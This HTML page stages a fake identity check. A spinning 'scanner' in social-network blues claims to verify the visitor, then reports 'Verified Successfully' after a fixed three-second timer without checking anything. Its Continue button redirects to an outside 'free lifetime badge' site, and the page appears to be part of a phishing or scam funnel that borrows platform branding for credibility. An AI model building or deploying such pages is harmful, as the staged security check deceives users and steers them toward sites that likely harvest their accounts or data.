<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Verification Complete</title>

<style>
body {
    margin: 0;
    padding: 0;
    background: linear-gradient(to bottom, #f4f8ff, #e3ecff);
    font-family: 'Segoe UI', Roboto, sans-serif;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}

.container {
    background: #ffffff;
    padding: 40px 30px;
    border-radius: 18px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
    text-align: center;
    max-width: 420px;
    width: 100%;
}

.scanner-ring {
    width: 180px;
    height: 180px;
    border-radius: 50%;
    background: conic-gradient(
        #1877f2,
        #1da1f2,
        #0a66c2,
        #1877f2
    );
    animation: spin 2s linear infinite;
    margin: 0 auto 24px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.scanner-core {
    width: 130px;
    height: 130px;
    background: #fff;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
    color: #1877f2;
    font-weight: bold;
}

.scanner-complete {
    animation: none;
    background: #e8f0ff;
    border: 3px solid #1877f2;
}

.status-message {
    font-size: 18px;
    color: #333;
    margin-bottom: 12px;
}

.verified-message {
    display: none;
    font-size: 20px;
    font-weight: 600;
    color: #1877f2;
    margin-top: 10px;
}

.continue-button {
    display: none;
    margin-top: 25px;
    padding: 12px 28px;
    background-color: #1877f2;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s ease;
}

.continue-button:hover {
    background-color: #0f5dc2;
}

@keyframes spin {
    0% { transform: rotate(0); }
    100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="container">
    <div class="scanner-ring" id="scannerRing">
        <div class="scanner-core" id="scannerCore"></div>
    </div>

    <div class="status-message" id="statusText">
        Verifying your identity securely...
    </div>

    <div class="verified-message" id="verifiedText">
        ✔ Verified Successfully
    </div>

    <button class="continue-button" id="continueBtn">
        Continue
    </button>
</div>

<script>
const redirectURL = "https://congratulations-free-lifetimebadge.vercel.app/"; 

setTimeout(() => {
    const ring = document.getElementById("scannerRing");
    const core = document.getElementById("scannerCore");

    ring.classList.add("scanner-complete");
    core.textContent = "✔";

    document.getElementById("statusText").style.display = "none";
    document.getElementById("verifiedText").style.display = "block";
    document.getElementById("continueBtn").style.display = "inline-block";

}, 3000);

document.getElementById("continueBtn").addEventListener("click", () => {
    window.location.href = redirectURL;
});
</script>

</body>
</html>
